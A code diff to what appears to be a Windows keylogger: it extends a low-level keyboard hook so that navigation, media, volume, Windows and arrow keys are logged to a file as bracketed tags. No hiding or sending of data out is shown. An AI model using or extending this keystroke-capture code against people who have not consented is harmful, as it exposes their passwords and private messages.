@@ -118,6 +118,141 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 				sprintf_s(logEntry, sizeof(logEntry), "[F%lu]", (unsigned long)functionKeyNumber);
 				write_to_file(logEntry);
 			}
+			else if (keyCode == VK_END)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[END]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_HOME)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[HOME]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_PRINT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[PRINT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_INSERT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[INSERT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_DELETE)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[DELETE]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LWIN)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LWIN]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_RWIN)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[RWIN]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_NAVIGATION_VIEW)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[NAV_VIEW]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_NAVIGATION_MENU)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[NAV_MENU]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_NAVIGATION_UP)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[NAV_UP]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_NAVIGATION_DOWN)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[NAV_DOWN]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_NAVIGATION_LEFT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[NAV_LEFT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_VOLUME_MUTE)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[VOL_MUTE]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_VOLUME_DOWN)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[VOL_DOWN]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_VOLUME_UP)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[VOL_UP]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_MEDIA_NEXT_TRACK)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_NEXT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_MEDIA_PREV_TRACK)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_PREV]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_MEDIA_STOP)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_STOP]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_MEDIA_PLAY_PAUSE)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[MEDIA_PLAY_PAUSE]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LAUNCH_MAIL)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_MAIL]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LAUNCH_MEDIA_SELECT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_MEDIA]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LAUNCH_APP1)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_APP1]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LAUNCH_APP2)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LAUNCH_APP2]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LEFT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LEFT_ARROW]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_UP)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[UP_ARROW]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_RIGHT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[RIGHT_ARROW]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_DOWN)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[DOWN_ARROW]");
+				write_to_file(logEntry);
+			}
 			else
 			{
 
